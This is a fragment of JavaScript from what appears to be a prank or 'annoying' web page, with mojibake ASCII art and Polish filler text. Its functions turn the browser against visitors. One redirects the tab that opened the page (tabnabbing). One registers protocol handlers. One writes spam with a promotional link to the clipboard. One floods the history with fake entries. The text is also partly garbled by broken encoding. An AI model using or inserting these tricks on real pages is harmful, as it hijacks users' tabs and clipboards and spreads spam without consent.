...
âââââ­âââââââŽââ ââ
ââ ââââłâłâłââ˛âââąâââ
âââ âââłâłâłââââââââ
âââ°ââŤâłâłâłâââ°âťâŻâââ
â âââââłâłâłâłâ˛âââąâââ
âââââ°âłâłâââłâłâŻâ â ââ
  `,
  `
ââââââââââââââââ
ââââââââââââââââ
...
//   'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
   'łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak łak',
...
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/public/karmen.PNG?child=true`
  }
}
...
function registerProtocolHandlers () {
  ...
  const handlerUrl = window.location.href + '/public/nowak1.png=%s'
...
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nSprawdz https://sapcord.pl/ptoszek'
...
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '/public/biceps.png?q=' + i)
  }
